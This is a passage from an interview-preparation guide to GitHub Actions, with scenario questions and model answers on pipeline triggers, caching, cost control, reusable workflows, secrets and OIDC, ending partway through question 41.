# GitHub Actions — Scenarios & Troubleshooting

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> 100 real-world design scenarios and 100 failures with the exact error text, answered the way a senior platform engineer would in the room · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to GitHub Actions](./README.md) · [🏠 Home](../README.md)

## Table of contents

**Part 1: Scenarios**
- [Pipeline Design & Triggers](#pipeline-design--triggers) — Q1–Q20
- [Speed, Caching & Cost](#speed-caching--cost) — Q21–Q36
- [Reuse at Scale: Reusable Workflows & Actions](#reuse-at-scale-reusable-workflows--actions) — Q37–Q52
- [Secrets, OIDC & Environments](#secrets-oidc--environments) — Q53–Q70
- [Security Hardening & Supply Chain](#security-hardening--supply-chain) — Q71–Q86
- [Runners, ARC, Monorepos & Releases](#runners-arc-monorepos--releases) — Q87–Q100

**Part 2: Troubleshooting**
- [Workflows Not Triggering & Invalid Files](#workflows-not-triggering--invalid-files) — Q101–Q118
- [Expressions, Outputs, Matrix & Conditions](#expressions-outputs-matrix--conditions) — Q119–Q134
- [Permissions, Tokens & Secrets](#permissions-tokens--secrets) — Q135–Q148
- [OIDC & Cloud Authentication](#oidc--cloud-authentication) — Q149–Q162
- [Caching, Artifacts, Builds & Scans](#caching-artifacts-builds--scans) — Q163–Q176
- [Runners, Self-hosted & ARC](#runners-self-hosted--arc) — Q177–Q190
- [Deployments, Environments & Releases](#deployments-environments--releases) — Q191–Q200

---

# Part 1: Scenarios

## Pipeline Design & Triggers

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. You join a team whose single 900-line workflow runs everything on every push to every branch. How do you restructure it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One file, no filters, no separation of CI and CD: slow feedback, wasted minutes, and deploys mixed with tests.

**What I'd do →**
1. Split by purpose: `ci.yml` (PR and `main`: lint, test, build), `cd.yml` (on `main`: image and deploys), `release.yml` (tags), `nightly.yml` (schedule).
2. Add triggers with filters:
   ```yaml
   on:
     pull_request:
     push:
       branches: [main]
   ```
3. Move repeated setup into a composite action and deploy logic into a reusable workflow.
4. Add `concurrency` with PR cancellation, `permissions: contents: read`, and `timeout-minutes` on every job.
5. Add a fan-in `ci-ok` job and make it the only required check.

**Why →** Smaller files are reviewable, PR feedback gets faster, and deploy permissions are isolated from test jobs.

**Interview tip →** Say "separate by trigger and by privilege", not just "split the file".

</details>

### Q2. Pushing to a PR branch runs CI twice (once for push, once for pull_request). How do you fix it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `on: [push, pull_request]` with no branch filters fires both events for every commit on a PR branch.

**What I'd do →**
1. Restrict `push` to long-lived branches and let PRs cover feature branches:
   ```yaml
   on:
     push:
       branches: [main, "release/**"]
     pull_request:
   ```
2. Add `concurrency` keyed on PR number or ref so leftovers cancel.

**Why →** Halves CI minutes for feature work while still validating `main` after merge.

**Interview tip →** Mention that `pull_request` tests the merge commit, which is more valuable than testing the branch head alone.

</details>

### Q3. Product wants a "Deploy to staging" button that lets QA pick a version. Design it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A manual, parameterized deploy with guardrails.

**What I'd do →**
1. `workflow_dispatch` with typed inputs:
   ```yaml
   on:
     workflow_dispatch:
       inputs:
         version: { type: string, required: true, description: "Image tag, for example v1.4.0" }
         environment: { type: environment, required: true }
   ```
2. A first job validates the tag exists in ECR (`aws ecr describe-images --image-ids imageTag=$VERSION`).
3. Call the reusable deploy workflow with `environment: ${{ inputs.environment }}`, so environment rules apply (prod still needs approvers).
4. Write the deployed version to `$GITHUB_STEP_SUMMARY`.

**Why →** QA self-serves without kubectl access, and the environment layer keeps prod controlled.

**Interview tip →** Use `type: environment` so the dropdown lists real environments and typos are impossible.

</details>

### Q4. A nightly security scan should run at 02:00 India time on weekdays and also be runnable on demand. Write it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cron is UTC; IST is UTC+5:30.

**What I'd do →**
1. Convert: 02:00 IST is 20:30 UTC the previous day, so weekdays Monday to Friday IST map to Sunday to Thursday UTC:
   ```yaml
   on:
     schedule:
       - cron: "30 20 * * 0-4"
     workflow_dispatch:
   ```
2. Guard against forks: `if: github.repository == 'devopsshack/shack-api'`.
3. Notify on failure only (`if: failure()`).

**Why →** The day-of-week shift is the classic mistake when converting to UTC.

**Interview tip →** Mention that schedules are best-effort and can be delayed at peak load, so do not use them for time-critical jobs.

</details>

### Q5. Your team wants preview environments per PR on EKS, destroyed when the PR closes. Design the workflow. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Lifecycle tied to PR events; must be safe for forks.

**What I'd do →**
1. Trigger on `pull_request` types `[opened, synchronize, reopened, labeled, closed]`, run only when label `preview` exists and the PR is from the same repo:
   ```yaml
   if: github.event.pull_request.head.repo.full_name == github.repository && contains(github.event.pull_request.labels.*.name, 'preview')
   ```
2. Deploy job (not closed): build image tagged `pr-${{ github.event.number }}`, `helm upgrade --install pr-123 ./chart -n preview-pr-123 --create-namespace`, environment `preview` with `url`.
3. Teardown job: `if: github.event.action == 'closed'`, `helm uninstall` and `kubectl delete ns`.
4. `concurrency: preview-${{ github.event.number }}` without cancel for teardown.
5. A nightly job deletes namespaces whose PR is closed, in case teardown failed.

**Why →** Fork PRs have no secrets, so restricting to same-repo PRs avoids failures and abuse.

**Interview tip →** Always mention the garbage collector job; teardown hooks fail eventually.

</details>

### Q6. Two workflows must run in sequence: CI then a separate deploy workflow owned by another team. How do you link them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate files, possibly separate owners.

**What I'd do →**
1. Prefer making deploy a reusable workflow the CI calls as a job with `needs`. One run, one graph, outputs passed directly.
2. If they must stay separate, use `workflow_run`:
   ```yaml
   on:
     workflow_run:
       workflows: ["CI"]
       types: [completed]
       branches: [main]
   jobs:
     deploy:
       if: github.event.workflow_run.conclusion == 'success'
   ```
3. Use `github.event.workflow_run.head_sha` to deploy exactly the CI-tested commit, and download its artifact with `run-id`.

**Why →** `workflow_run` alone triggers on failures too and runs on the default branch context, so the conclusion and SHA checks are required.

**Interview tip →** Mention that `workflow_run` only chains up to three levels deep.

</details>

### Q7. A merge queue is enabled, but PRs sit in the queue forever. What is your design fix? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Required checks never report on the queue's temporary branches.

**What I'd do →**
1. Add the trigger:
   ```yaml
   on:
     pull_request:
     merge_group:
   ```
2. Make sure job names in `merge_group` runs match the required check (fan-in `ci-ok`).
3. Do not use `paths` filters on that workflow; queue commits combine multiple PRs.

**Why →** The queue waits for required checks on `gh-readonly-queue/...` commits, which only `merge_group` produces.

**Interview tip →** Explain the merge queue value: it tests the combination of PRs, preventing "green PR, red main".

</details>

### Q8. Your deploy job must run only for pushes to `main` and for `v*` tags, never for PRs. Write the conditions. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Routing logic at job level.

**What I'd do →**
1. Trigger on both:
   ```yaml
   on:
     pull_request:
     push:
       branches: [main]
       tags: ["v*"]
   ```
2. Gate the deploy job:
   ```yaml
   deploy:
     needs: build
     if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v'))
   ```
3. Back it with environment deployment branch policies so the YAML is not the only protection.

**Why →** Defence in depth: someone can edit the YAML in a branch, but not the environment policy.

**Interview tip →** "Conditions are routing, environments are enforcement."

</details>

### Q9. A database migration must run once per deploy, before the app rolls out, with approval in prod. How do you model it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ordered, gated, and must not run concurrently.

**What I'd do →**
1. Separate job `migrate` with `environment: prod` and `concurrency: { group: migrate-prod, cancel-in-progress: false }`.
2. Run the migration as a Kubernetes Job using the same image digest (`kubectl apply` then `kubectl wait --for=condition=complete job/migrate-<sha> --timeout=10m`).
3. `deploy` has `needs: migrate`.
4. Migrations are backward compatible (expand and contract), so rollback of the app does not require rolling back the schema.

**Why →** Approval once, ordering guaranteed by `needs`, no parallel migrations thanks to concurrency.

**Interview tip →** Mention expand and contract; interviewers look for schema rollback awareness.

</details>

### Q10. Developers complain CI takes 25 minutes. Where do you start? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need data before optimizing.

**What I'd do →**
1. Pull timings: `gh run view <id> --json jobs --jq '.jobs[] | {name, startedAt, completedAt}'` across 20 runs, and check queue time vs execution time.
2. Look for: serial jobs that could be parallel, missing caches (setup step minutes), Docker builds without layer cache, tests not sharded, a full matrix on every PR.
3. Fix in order of impact: caching, parallelism with `needs` graph, test sharding with matrix, PR-only reduced matrix, cancel superseded runs.
4. If queue time dominates, the account's concurrency limit or self-hosted capacity is the bottleneck, not the YAML.

**Why →** Queue time and run time have completely different fixes.

**Interview tip →** Quote a before-and-after number from your own experience.

</details>

### Q11. You need to run integration tests against Postgres and Redis in CI. How do you set it up? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Service containers are the native fit.

**What I'd do →**
1. Declare services with health checks:
   ```yaml
   services:
     postgres:
       image: postgres:16
       env: { POSTGRES_PASSWORD: test, POSTGRES_DB: app }
       ports: ["5432:5432"]
       options: --health-cmd "pg_isready -U postgres" --health-interval 5s --health-retries 10
     redis:
       image: redis:7
       ports: ["6379:6379"]
   ```
2. Point the app at `localhost` (job on host) with `env: DATABASE_URL: postgres://postgres:test@localhost:5432/app`.
3. Run migrations then tests.

**Why →** Services start before steps and are torn down automatically; health options prevent "connection refused" races.

**Interview tip →** Explain `localhost` vs service-name networking for host vs container jobs.

</details>

### Q12. You must support Node 20, 22 and 24 on Linux, plus Node 22 on Windows only. Write the matrix. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Base matrix plus a standalone extra combination.

**What I'd do →**
1. Define the matrix:
   ```yaml
   strategy:
     fail-fast: false
     matrix:
       os: [ubuntu-24.04]
       node: [20, 22, 24]
       include:
         - os: windows-2025
           node: 22
   runs-on: ${{ matrix.os }}
   ```
2. Use `shell: bash` for scripts so they run on Windows (Git Bash) too.

**Why →** `include` with a combination that matches nothing adds a new leg, keeping the matrix minimal.

**Interview tip →** `fail-fast: false` so a Windows-only failure does not hide Linux results.

</details>

### Q13. Builds must be reproducible: the same commit should produce the same pipeline behaviour next month. What do you pin? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Drift comes from runner images, actions, tool versions and dependencies.

**What I'd do →**
1. `runs-on: ubuntu-24.04` (not latest).
2. Actions pinned to SHAs with Dependabot updates.
3. Tool versions explicit: `node-version-file: .nvmrc`, `terraform_version: 1.9.8`, kubectl via `azure/setup-kubectl` with `version: v1.31.2`.
4. Lockfiles with `npm ci`, `pip install --require-hashes`.
5. Base images pinned by digest in Dockerfiles.

**Why →** "Nothing changed but CI broke" is almost always one of these floating.

**Interview tip →** Mention that hosted runner images update weekly; preinstalled tool versions are not a contract.

</details>

### Q14. You want to run expensive E2E tests only when a PR has the `run-e2e` label, and re-run when the label is added. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Needs the `labeled` activity type plus a condition.

**What I'd do →**
1. Trigger on the label event and filter on the label name:
   ```yaml
   on:
     pull_request:
       types: [opened, synchronize, reopened, labeled]
   jobs:
     e2e:
       if: contains(github.event.pull_request.labels.*.name, 'run-e2e')
   ```
2. Use a concurrency group per PR so adding another label does not run E2E twice in parallel.
3. Make E2E non-required, or required through the fan-in job that treats `skipped` as pass.

**Why →** Labels are a cheap opt-in for expensive suites.

**Interview tip →** Note that `labeled` fires for any label, hence the `contains` filter.

</details>

### Q15. Leadership wants a weekly report of failed workflow runs across 50 repos. How do you build it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cross-repo read access and aggregation.

**What I'd do →**
1. Central repo with a `schedule` workflow.
2. GitHub App token with `actions: read` on the org's repos (`actions/create-github-app-token` with `owner: devopsshack`).
3. Script with `gh api --paginate "repos/ORG/$r/actions/runs?status=failure&created=>=$(date -d '7 days ago' +%F)"`, aggregate by workflow and repo.
4. Write markdown to `$GITHUB_STEP_SUMMARY` and post to Slack.

**Why →** `GITHUB_TOKEN` is single-repo; an App token is the right cross-repo identity.

**Interview tip →** For orgs at scale, mention streaming audit logs and Actions metrics instead of polling.

</details>

### Q16. You need to run a job only when files in `infra/` changed, but the workflow also has other jobs that always run. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Workflow-level `paths` would skip everything; need job-level filtering.

**What I'd do →**
1. A `changes` job using `dorny/paths-filter` with outputs `infra: 'true'|'false'`.
2. `terraform` job: `needs: changes`, `if: needs.changes.outputs.infra == 'true'`.
3. Fan-in job treats `skipped` as success.

**Why →** Skipped jobs report as success to branch protection, skipped workflows report nothing.

**Interview tip →** This is the canonical answer to "path filters vs required checks".

</details>

### Q17. A flaky test fails 1 in 10 runs and blocks merges. What do you do with the pipeline? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pipeline reliability problem with a code root cause.

**What I'd do →**
1. Quantify: search failed runs for the test name (`gh run view --log-failed`), tag it.
2. Quarantine: move it to a separate non-blocking job with `continue-on-error: true` and a tracking issue with an owner and date.
3. Fix the cause (time, ordering, shared state, network) and move it back.
4. Avoid blanket retries in the pipeline; if used, retry only the specific test with the framework's retry and report retries.

**Why →** Retries hide flakiness; quarantine keeps visibility while unblocking the team.

**Interview tip →** "Flaky tests are bugs with an owner and a deadline."

</details>

### Q18. You want CI results visible to reviewers without opening logs. What do you add? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Improve signal on the PR page.

**What I'd do →**
1. Annotations from linters (`eslint -f @microsoft/eslint-formatter-sarif` uploaded to code scanning, or problem matchers).
2. Test summary in `$GITHUB_STEP_SUMMARY` (pass, fail, slowest tests).
3. Coverage comment via a `workflow_run` job (works for forks too).
4. Upload HTML reports as artifacts with short retention.

**Why →** Reviewers see failures inline on the diff and the summary page.

**Interview tip →** Mention `::error file=,line=::` annotations; it shows you know workflow commands.

</details>

### Q19. A workflow must run Terraform plan on PRs and apply on merge, with the plan reviewed. Design it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Plan and apply must correspond, apply must be gated.

**What I'd do →**
1. PR: `terraform plan -out=tfplan` with a read-only OIDC role (`sub` = `pull_request`), post the plan text as a PR comment (via `workflow_run` for forks), upload `tfplan` is not reused because state may change.
2. Merge to `main`: re-plan with the apply role, upload plan, then an `apply` job with `environment: prod-infra` (required reviewers) that downloads the plan artifact and runs `terraform apply tfplan`.
3. `concurrency: terraform-prod` with no cancel to protect state.
4. The apply role's trust: `repo:ORG/infra:environment:prod-infra`.

**Why →** Reviewers approve the exact saved plan that will be applied, and only the gated job holds write credentials.

**Interview tip →** Explain why the PR plan is not applied: state can drift between PR and merge.

</details>

### Q20. Your company forbids deploys on Friday after 16:00 and during incidents. How do you enforce it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Policy that must not depend on YAML in every repo.

**What I'd do →**
1. Use a custom deployment protection rule (a GitHub App) on the `prod` environment that checks the change calendar and the incident tool API, then approves or rejects.
2. As a lighter option, a required first step in the shared reusable deploy workflow that checks the window and fails with a clear message, with a `force` input that requires an extra environment (`prod-emergency`) with senior approvers.
3. Log every override to the summary and Slack.

**Why →** Environment-level rules apply to every workflow that targets `prod` and cannot be removed by editing one repo's YAML.

**Interview tip →** Always include a documented break-glass path; freezes without one get bypassed badly.

</details>

---

## Speed, Caching & Cost

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q21. `npm ci` takes 4 minutes on every run. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No dependency caching.

**What I'd do →**
1. Configure built-in caching and a lean install:
   ```yaml
   - uses: actions/setup-node@v4
     with:
       node-version-file: .nvmrc
       cache: npm
   - run: npm ci --prefer-offline --no-audit --no-fund
   ```
2. Confirm "Cache restored from key: node-cache-Linux-x64-npm-<hash>" in logs.
3. Make sure a run on `main` populates the cache so PRs inherit it.

**Why →** The download cache cuts most of the time; `npm ci` keeps installs exact.

**Interview tip →** Explain branch scoping: PR caches do not help other PRs, `main` caches do.

</details>

### Q22. Docker builds take 12 minutes even when only one line of code changed. Speed them up. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No layer cache on ephemeral runners, likely poor Dockerfile ordering.

**What I'd do →**
1. Fix Dockerfile order: copy lockfile, install, then copy source.
2. Use BuildKit with the GHA cache:
   ```yaml
   - uses: docker/setup-buildx-action@v3
   - uses: docker/build-push-action@v6
     with:
       cache-from: type=gha,scope=api
       cache-to: type=gha,mode=max,scope=api
   ```
3. Use `RUN --mount=type=cache,target=/root/.npm npm ci` for package caches inside the build.
4. For images over a few GB, use `type=registry` cache in ECR instead to avoid evicting the repo's other caches.

**Why →** Each hosted job starts with an empty Docker daemon; without an exported cache nothing is reused.

**Interview tip →** Mention `mode=max` for multi-stage builds.

</details>

### Q23. The repo hits the 10 GB cache limit daily and hit rates are poor. What do you change? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cache thrashing: too many large, unique caches.

**What I'd do →**
1. `gh cache list --sort size_in_bytes --limit 30` to find the biggest keys.
2. Save caches only on `main` (`actions/cache/restore` everywhere, `actions/cache/save` with `if: github.ref == 'refs/heads/main'`).
3. Remove `github.sha` or run IDs from keys where not needed.
4. Give Docker caches a `scope` and move big ones to registry cache.
5. Delete PR caches on PR close (`gh cache delete --ref refs/pull/N/merge` in a cleanup workflow).

**Why →** LRU eviction across branches throws away the useful `main` caches first when PRs flood the store.

**Interview tip →** "Write caches on main, read them everywhere."

</details>

### Q24. macOS jobs are 60% of your bill. What are your options? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** macOS minutes have a 10x multiplier in private repos.

**What I'd do →**
1. Run macOS only where required (iOS build and signing), not for lint or unit tests that can run on Linux.
2. Run the full macOS matrix on `main` and nightly, a single leg on PRs.
3. Cache CocoaPods, SPM and DerivedData.
4. Path filter so backend changes do not trigger iOS pipelines.
5. Evaluate self-hosted Mac minis or a cloud Mac provider for very high volume, including maintenance cost.

**Why →** Most savings come from not running macOS at all for jobs that do not need it.

**Interview tip →** Quote the multipliers: Linux 1x, Windows 2x, macOS 10x.

</details>

### Q25. A job sometimes hangs and burns 6 hours. How do you stop it happening again? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default 360-minute timeout.

**What I'd do →**
1. Set `timeout-minutes` on every job based on p95 duration times 2 (for example 20).
2. Add step-level timeouts on network steps and tool timeouts (`kubectl rollout status --timeout=300s`, `curl --max-time 30`).
3. Add an actionlint or custom check that fails PRs adding jobs without `timeout-minutes`.

**Why →** A single hung job on a large runner can cost more than a week of normal CI.

**Interview tip →** Mention that timeouts also free up concurrency slots, not just money.

</details>

### Q26. Your PR matrix is 3 OS times 4 versions (12 jobs). How do you cut cost without losing coverage? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Full coverage is needed before release, not on every PR push.

**What I'd do →**
1. Build the matrix dynamically: on `pull_request`, Linux with the latest and oldest supported versions; on `push` to `main` and nightly, the full matrix.
   ```yaml
   matrix: ${{ fromJSON(github.event_name == 'pull_request' && '{"os":["ubuntu-24.04"],"node":[20,24]}' || '{"os":["ubuntu-24.04","windows-2025","macos-15"],"node":[20,22,24]}') }}
   ```
2. Keep the fan-in check stable regardless of matrix size.

**Why →** Most regressions surface on one OS and the version extremes.

**Interview tip →** Show the `fromJSON` ternary trick; it proves fluency with expressions.

</details>

### Q27. Test suite takes 30 minutes on one runner. How do you parallelize it in Actions? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Sharding across matrix legs.

**What I'd do →**
1. Split into shards:
   ```yaml
   strategy:
     fail-fast: false
     matrix:
       shard: [1, 2, 3, 4, 5, 6]
   steps:
     - run: npx jest --shard=${{ matrix.shard }}/${{ strategy.job-total }}
   ```
2. Upload per-shard results (`junit-${{ matrix.shard }}`) and merge in a fan-in job.
3. Balance shards by timing data if the tool supports it.

**Why →** Wall-clock drops roughly 5x; billed minutes rise slightly due to per-job overhead.

**Interview tip →** Be honest that sharding trades minutes for developer time.

</details>

### Q28. Every PR runs a 10-minute CodeQL scan for a docs change. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Missing path filters on a non-required analysis workflow.

**What I'd do →**
1. Exclude docs from the trigger:
   ```yaml
   on:
     pull_request:
       paths-ignore: ["docs/**", "**/*.md"]
   ```
2. If it is a required check, instead do job-level filtering so a check is still reported.

**Why →** Workflow-level filters are fine for non-required workflows and save the most.

**Interview tip →** Always ask "is it required?" before adding workflow-level path filters.

</details>

### Q29. Builds download the same 2 GB ML model on every run. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Large static input; cache or move it.

**What I'd do →**
1. `actions/cache` keyed on the model version: `key: model-${{ vars.MODEL_VERSION }}`.
2. If it exceeds what the cache can hold well (with other caches), host it in S3 in the same region as self-hosted runners and pull with OIDC credentials.
3. For ARC runners, bake it into the runner image or a node-local volume.

**Why →** Version-keyed caches never invalidate accidentally and restore in seconds.

**Interview tip →** Mention the repo cache quota as a constraint on big blobs.

</details>

### Q30. You want to know which workflows consume the most minutes across the org. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Billing visibility.

**What I'd do →**
1. Org Settings, Billing: usage report CSV per repo and workflow, and the Actions usage metrics in org Insights.
2. API: `gh api repos/ORG/REPO/actions/runs/RUN_ID/timing` for per-run billable ms by OS.
3. Rank by minutes times multiplier, then target the top 5 workflows.

**Why →** Cost work follows a power law; a few workflows dominate.

**Interview tip →** Mention measuring before and after each change.

</details>

### Q31. A Go monorepo build is slow because the Go build cache is cold. Optimize. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two caches matter: module download cache and build cache.

**What I'd do →**
1. `actions/setup-go@v5` with `go-version-file: go.mod` (caching on by default, keyed on `go.sum`).
2. Set `cache-dependency-path` for multiple modules: `"**/go.sum"`.
3. Restore-only on PRs, save on `main` if cache churn is a problem.

**Why →** The build cache (`~/.cache/go-build`) avoids recompiling unchanged packages.

**Interview tip →** Know the two directories: `GOMODCACHE` and `GOCACHE`.

</details>

### Q32. Small lint, format and typecheck jobs each take 40 seconds of setup for 10 seconds of work. Should you merge them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-job overhead dominates.

**What I'd do →**
1. Merge into one `static-checks` job with sequential steps, each named clearly.
2. Use `if: ${{ !cancelled() }}` on later steps so all checks report even if one fails.
3. Keep long, independent suites (unit tests, build) as separate parallel jobs.

**Why →** Each job pays VM allocation, checkout, setup and cache restore.

**Interview tip →** "Fat jobs for tiny tasks, parallel jobs for long ones."

</details>

### Q33. Artifact storage costs are climbing. What do you change? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** 90-day default retention on large build outputs.

**What I'd do →**
1. Set `retention-days: 3` on intermediate artifacts, keep reports for 14.
2. Lower the repo or org default retention.
3. Move release binaries to GitHub Releases or a registry.
4. Delete old artifacts via API in bulk if needed.

**Why →** Most artifacts are only useful for the next job or the next day.

**Interview tip →** Distinguish artifacts (run outputs) from releases (deliverables).

</details>

### Q34. Multi-arch images take 40 minutes because arm64 builds use QEMU. Fix it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Emulation is 5 to 20 times slower than native.

**What I'd do →**
1. Matrix over native runners: `ubuntu-24.04` (amd64) and `ubuntu-24.04-arm` (arm64).
2. Each leg builds and pushes by digest only (`outputs: type=image,push-by-digest=true,name-canonical=true,push=true`) and uploads the digest as artifact `digest-${{ matrix.arch }}`.
3. Merge job downloads digests and runs `docker buildx imagetools create -t $IMAGE:$TAG $IMAGE@sha256:a $IMAGE@sha256:b`.

**Why →** Native builds remove emulation entirely; the manifest list makes one tag serve both architectures.

**Interview tip →** Name the pattern: "build by digest per platform, merge manifest".

</details>

### Q35. A workflow rebuilds the same image in staging and prod deploys. What is wrong and how do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebuilding per environment wastes minutes and breaks the guarantee that tested equals shipped.

**What I'd do →**
1. Build once in a `build` job, output the digest.
2. Deploy jobs (or reusable workflow calls) use `image@digest` from `needs.build.outputs.digest`.
3. Promotion to prod via release tag adds a tag to the existing manifest, no rebuild.

**Why →** Rebuilds can pull different base images or dependencies, so prod runs something nobody tested.

**Interview tip →** "Build once, deploy many, by digest."

</details>

### Q36. Self-hosted runners are idle 70% of the time but queues spike at 10:00. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Static capacity sized for peak.

**What I'd do →**
1. Move to ARC with `minRunners` small and `maxRunners` sized for peak, on a node pool managed by Karpenter with spot instances for CI.
2. Schedule higher `minRunners` during working hours (a CronJob that patches the scale set, or two scale sets).
3. Pre-pull the runner image on nodes and keep images small to reduce cold starts.
4. Measure queue time from the run timing API before and after.

**Why →** Autoscaling turns idle cost into burst cost, and spot cuts the burst cost further.

**Interview tip →** Mention handling spot interruptions: jobs are retried by re-running, so keep jobs idempotent.

</details>

---

## Reuse at Scale: Reusable Workflows & Actions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q37. Forty microservice repos each have a slightly different copy of the same build workflow. How do you standardize? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Copy-paste drift; fixes do not propagate.

**What I'd do →**
1. Create `devopsshack/platform-workflows` with reusable workflows: `build-image.yml`, `deploy-eks.yml`, `security-scan.yml`, each with typed inputs and outputs.
2. Set the repo's Actions access to "Accessible from repositories in the organization".
3. Release with semver tags and a moving `v1`; consumers pin `@v1` (or SHA with Renovate).
4. Migrate repos with a scripted PR (gh CLI loop), starting with two pilot teams.
5. Enforce a minimum baseline (scan workflow) through a ruleset "require workflows to pass".

**Why →** One fix lands everywhere with a version bump, and governance moves to the platform team.

**Interview tip →** Mention versioning and a migration plan; a central workflow without versions breaks everyone at once.

</details>

### Q38. A team wants to share "checkout, setup Java, Maven cache, run Sonar" steps. Reusable workflow or composite action? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A sequence of steps that should run inside the consumer's job.

**What I'd do →**
1. Composite action in `platform-actions/java-setup/action.yml`, inputs `java-version` and `sonar-token`.
2. Consumers add it as one step and keep their own job settings and runner choice.

**Why →** No need for separate runners, environments or permissions; a composite is lighter and composes with the consumer's other steps.

**Interview tip →** Note the composite cannot read `secrets` directly, so the Sonar token is an input.

</details>

### Q39. A shared reusable workflow change broke 120 pipelines on Monday. How do you prevent a repeat? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Consumers referenced `@main` and got an untested change.

**What I'd do →**
1. Stop `@main` references: publish semver tags; consumers use `@v2` or SHAs.
2. Add a test matrix in the workflows repo that calls each reusable workflow against sample apps on every PR.
3. Release breaking changes as a new major with a migration note and overlap period.
4. Canary: bump a few internal repos first via Renovate grouping.

**Why →** Shared CI is production software and deserves release engineering.

**Interview tip →** "We treat the platform workflow repo like a library with semver."

</details>

### Q40. A called reusable workflow needs a Sonar token, an npm token and AWS access. How do you pass them? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secrets plus cloud identity across a workflow boundary.

**What I'd do →**
1. Declare named secrets in `workflow_call.secrets` (`SONAR_TOKEN`, `NPM_TOKEN`) and pass explicitly from the caller.
2. No AWS secret at all: caller job grants `id-token: write`, the called workflow runs `configure-aws-credentials` with a role ARN input.
3. Trust policy can pin to the reusable workflow via `job_workflow_ref` claim if the org customizes `sub`.

**Why →** Explicit secrets document the contract; OIDC removes the most dangerous secret.

**Interview tip →** Mention why `secrets: inherit` is avoided across team boundaries.

</details>

### Q41. You want to ensure only the central deploy workflow can assume the production AWS role, not arbitrary workflows in app repos. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default `sub` identifies the repo and environment, not the workflow file.

**What I'd do →**
1. Customize the OIDC subject template for the org or repos to include `job_workflow_ref`:
